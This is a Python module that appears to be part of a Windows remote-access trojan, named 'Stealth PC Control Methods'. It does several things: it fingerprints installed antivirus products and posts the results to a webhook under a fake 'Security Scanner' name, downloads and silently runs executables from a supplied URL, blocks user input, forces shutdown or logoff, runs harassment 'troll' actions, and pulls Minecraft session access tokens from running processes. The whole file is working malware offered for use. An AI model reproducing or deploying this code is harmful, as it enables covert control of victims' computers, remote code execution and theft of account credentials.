# control_methods.py - Stealth PC Control Methods
import socket
import random
import threading
import time
import ctypes
from ctypes import wintypes
import os
import subprocess
import tempfile
import winreg
import winsound
import psutil
import re
import json
from datetime import datetime
import urllib.request
import base64

# Global variables for input blocking
_input_blocked = False

def _block_input(block):
    """Block or unblock keyboard and mouse input"""
    try:
        ctypes.windll.user32.BlockInput(block)
        return True
    except Exception:
        return False

def _get_antivirus_info():
    """Comprehensive antivirus detection"""
    av_list = []
    
    # Common antivirus registry paths and identifiers
    av_signatures = [
        # Windows Defender
        {
            'name': 'Windows Defender',
            'reg_paths': [
                r"SOFTWARE\Microsoft\Windows Defender",
                r"SOFTWARE\Microsoft\Windows Defender Advanced Threat Protection"
            ],
            'services': ['WinDefend', 'Sense', 'MsMpEng'],
            'processes': ['MsMpEng.exe', 'NisSrv.exe', 'MsMpEng.exe']
        },
        # Malwarebytes
        {
            'name': 'Malwarebytes',
            'reg_paths': [
                r"SOFTWARE\Malwarebytes",
                r"SOFTWARE\Malwarebytes' Anti-Malware"
            ],
            'services': ['MBAMService', 'MBAMChameleon'],
            'processes': ['mbam.exe', 'MBAMService.exe']
        },
        # Norton
        {
            'name': 'Norton Security',
            'reg_paths': [
                r"SOFTWARE\Norton",
                r"SOFTWARE\Symantec",
                r"SOFTWARE\NortonSecurity"
            ],
            'services': ['Norton', 'Symantec', 'N360'],
            'processes': ['ccSvcHst.exe', 'ns.exe']
        },
        # McAfee
        {
            'name': 'McAfee',
            'reg_paths': [
                r"SOFTWARE\McAfee",
                r"SOFTWARE\McAfee.com"
            ],
            'services': ['McAfee', 'mfevtp', 'mfemms'],
            'processes': ['mcshield.exe', 'mfefire.exe']
        },
        # Kaspersky
        {
            'name': 'Kaspersky',
            'reg_paths': [
                r"SOFTWARE\Kaspersky",
                r"SOFTWARE\KasperskyLab"
            ],
            'services': ['AVP', 'ksde', 'klnagent'],
            'processes': ['avp.exe', 'avpui.exe']
        },
        # Bitdefender
        {
            'name': 'Bitdefender',
            'reg_paths': [
                r"SOFTWARE\Bitdefender",
                r"SOFTWARE\Bitdefender Antivirus"
            ],
            'services': ['Bitdefender', 'VSServ', 'bdagent'],
            'processes': ['bdagent.exe', 'vsserv.exe']
        },
        # Avast
        {
            'name': 'Avast',
            'reg_paths': [
                r"SOFTWARE\Avast",
                r"SOFTWARE\AVAST Software"
            ],
            'services': ['Avast', 'afwServ', 'avast'],
            'processes': ['avastui.exe', 'afwServ.exe']
        },
        # AVG
        {
            'name': 'AVG',
            'reg_paths': [
                r"SOFTWARE\AVG",
                r"SOFTWARE\AVG Technologies"
            ],
            'services': ['AVG', 'avg', 'avgemc'],
            'processes': ['avgui.exe', 'avgsvc.exe']
        },
        # ESET
        {
            'name': 'ESET',
            'reg_paths': [
                r"SOFTWARE\ESET",
                r"SOFTWARE\Eset"
            ],
            'services': ['ekrn', 'egui', 'eset'],
            'processes': ['ekrn.exe', 'egui.exe']
        },
        # Trend Micro
        {
            'name': 'Trend Micro',
            'reg_paths': [
                r"SOFTWARE\TrendMicro",
                r"SOFTWARE\Trend Micro"
            ],
            'services': ['Trend Micro', 'ntrtscan', 'tmccsf'],
            'processes': ['ntrtscan.exe', 'tmccsf.exe']
        }
    ]
    
    # Check registry
    registry_paths = [
        winreg.HKEY_LOCAL_MACHINE,
        winreg.HKEY_CURRENT_USER
    ]
    
    for av in av_signatures:
        detected = False
        
        # Check registry
        for hive in registry_paths:
            for reg_path in av['reg_paths']:
                try:
                    key = winreg.OpenKey(hive, reg_path)
                    winreg.CloseKey(key)
                    if av['name'] not in av_list:
                        av_list.append(av['name'])
                    detected = True
                    break
                except:
                    pass
            if detected:
                break
        
        # Check services
        if not detected:
            try:
                services = subprocess.check_output(
                    ['sc', 'query', 'type=', 'service', 'state=', 'all'], 
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode('latin-1')
                
                for service in av['services']:
                    if service.lower() in services.lower():
                        if av['name'] not in av_list:
                            av_list.append(av['name'])
                        detected = True
                        break
            except:
                pass
        
        # Check processes
        if not detected:
            try:
                for proc in psutil.process_iter(['name']):
                    if any(av_proc.lower() == proc.info['name'].lower() for av_proc in av['processes']):
                        if av['name'] not in av_list:
                            av_list.append(av['name'])
                        break
            except:
                pass
    
    # Check Windows Security Center for additional AV detection
    try:
        import wmi
        c = wmi.WMI()
        for item in c.Win32_Product():
            name = item.Name or ""
            description = item.Description or ""
            if any(term in name.lower() or term in description.lower() for term in 
                  ['antivirus', 'security', 'endpoint', 'defender', 'protection']):
                if name and name not in av_list:
                    av_list.append(name)
    except:
        pass
    
    return av_list

def _send_to_webhook(webhook_url, data):
    """Send data to webhook"""
    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        payload = {
            'content': f"Antivirus Scan Results:\n```{data}```",
            'username': 'Security Scanner'
        }
        
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(payload).encode('utf-8'),
            headers=headers,
            method='POST'
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            return response.status == 200
    except Exception:
        return False

def attack_controlpc(target, duration=60):
    """Remote control PC functions"""
    parts = target.split('|')
    command = parts[0]
    
    try:
        if command == "shutdown":
            subprocess.run(["shutdown", "/s", "/t", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "restart":
            subprocess.run(["shutdown", "/r", "/t", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "lock":
            ctypes.windll.user32.LockWorkStation()
            
        elif command == "logoff":
            subprocess.run(["shutdown", "/l", "/f"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "close_minecraft":
            subprocess.run(["taskkill", "/f", "/im", "javaw.exe"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "popup":
            if len(parts) > 1:
                message = parts[1]
                ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0x00001000)
                
        elif command == "download_execute":
            if len(parts) > 1:
                url = parts[1]
                import urllib.request
                
                temp_dir = tempfile.mkdtemp()
                file_name = url.split('/')[-1] or "file.exe"
                file_path = os.path.join(temp_dir, file_name)
                
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                req = urllib.request.Request(url, headers=headers)
                
                with urllib.request.urlopen(req) as response, open(file_path, 'wb') as out_file:
                    out_file.write(response.read())
                
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                subprocess.Popen(file_path, startupinfo=startupinfo, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                
        elif command == "freeze_keyboard":
            _block_input(True)
            
        elif command == "freeze_mouse":
            _block_input(True)
            
        elif command == "freeze_both":
            _block_input(True)
            
        elif command == "unfreeze":
            _block_input(False)
            
        elif command == "check_av":
            if len(parts) > 1:
                webhook_url = parts[1]
                av_list = _get_antivirus_info()
                
                if av_list:
                    av_text = "\n".join(av_list)
                    result = f"Antivirus Software Found:\n{av_text}"
                else:
                    result = "No known antivirus software detected"
                
                # Send to webhook instead of showing popup
                _send_to_webhook(webhook_url, result)
                
        elif command == "troll":
            if len(parts) > 1:
                troll_cmd = parts[1]
                
                if troll_cmd == "open_cd":
                    ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
                    
                elif troll_cmd == "swap_mouse":
                    current = ctypes.windll.user32.GetSystemMetrics(23)
                    ctypes.windll.user32.SwapMouseButton(not current)
                    
                elif troll_cmd == "rotate_screen":
                    device = ctypes.windll.user32.EnumDisplayDevicesW(None, 0, 0)
                    ctypes.windll.user32.ChangeDisplaySettingsExW(device.DeviceName, None, None, 0x00000004 | 0x00000002, None)
                    
                elif troll_cmd == "invert_colors":
                    SPI_SETHIGHCONTRAST = 0x0043
                    HCF_HIGHCONTRASTON = 0x00000001
                    class HIGHCONTRAST(ctypes.Structure):
                        _fields_ = [('cbSize', ctypes.c_uint),
                                   ('dwFlags', ctypes.c_uint),
                                   ('lpszDefaultScheme', ctypes.c_wchar_p)]
                    hc = HIGHCONTRAST()
                    hc.cbSize = ctypes.sizeof(HIGHCONTRAST)
                    hc.dwFlags = HCF_HIGHCONTRASTON
                    hc.lpszDefaultScheme = None
                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, ctypes.sizeof(hc), ctypes.byref(hc), 0)
                    
                elif troll_cmd == "mouse_jiggler":
                    def jiggle_mouse():
                        while True:
                            x = random.randint(0, 1920)
                            y = random.randint(0, 1080)
                            ctypes.windll.user32.SetCursorPos(x, y)
                            time.sleep(30)
                    
                    thread = threading.Thread(target=jiggle_mouse, daemon=True)
                    thread.start()
                    
                elif troll_cmd == "keyboard_spam":
                    def spam_keys():
                        while True:
                            ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
                            ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
                            time.sleep(10)
                    
                    thread = threading.Thread(target=spam_keys, daemon=True)
                    thread.start()
                    
                elif troll_cmd == "play_sound":
                    winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
                    
                elif troll_cmd == "change_wallpaper":
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
        
    except Exception:
        pass

def attack_refresh_session_id(target, duration=0):
    """Extract Minecraft session information"""
    try:
        session_data = {
            'success': False,
            'timestamp': datetime.now().isoformat(),
            'sessions': []
        }
        
        def find_minecraft_processes():
            minecraft_processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'].lower() == 'javaw.exe':
                        cmdline = ' '.join(proc.info['cmdline'] or [])
                        minecraft_indicators = ['net.minecraft.client.main', '--username', '--uuid', '--version']
                        if any(indicator in cmdline for indicator in minecraft_indicators):
                            minecraft_processes.append(proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return minecraft_processes
        
        def extract_session_info(process):
            try:
                cmdline = ' '.join(process.info['cmdline'] or [])
                
                session_patterns = [
                    r'--session\s+([^\s]+)',
                    r'--session=([^\s]+)',
                    r'-Dsessionid=([^\s]+)',
                    r'--accessToken\s+([^\s]+)',
                    r'--accessToken=([^\s]+)',
                    r'-DaccessToken=([^\s]+)',
                ]
                
                username_pattern = r'--username[=\s]?([^\s]+)'
                uuid_pattern = r'--uuid[=\s]?([^\s]+)'
                version_pattern = r'--version[=\s]?([^\s]+)'
                
                session_id = None
                for pattern in session_patterns:
                    match = re.search(pattern, cmdline)
                    if match:
                        session_id = match.group(1)
                        break
                
                username_match = re.search(username_pattern, cmdline)
                uuid_match = re.search(uuid_pattern, cmdline)
                version_match = re.search(version_pattern, cmdline)
                
                return {
                    'pid': process.info['pid'],
                    'session_id': session_id if session_id else 'Not found',
                    'username': username_match.group(1) if username_match else 'Unknown',
                    'uuid': uuid_match.group(1) if uuid_match else 'Unknown',
                    'version': version_match.group(1) if version_match else 'Unknown',
                    'found': session_id is not None
                }
                
            except Exception as e:
                return {'error': str(e), 'found': False}
        
        processes = find_minecraft_processes()
        for process in processes:
            session_info = extract_session_info(process)
            session_data['sessions'].append(session_info)
        
        session_data['success'] = len(session_data['sessions']) > 0
        session_data['process_count'] = len(session_data['sessions'])
        
        return f"SESSION_DATA:{json.dumps(session_data)}"
        
    except Exception as e:
        error_data = {
            'success': False,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }
        return f"SESSION_DATA:{json.dumps(error_data)}"
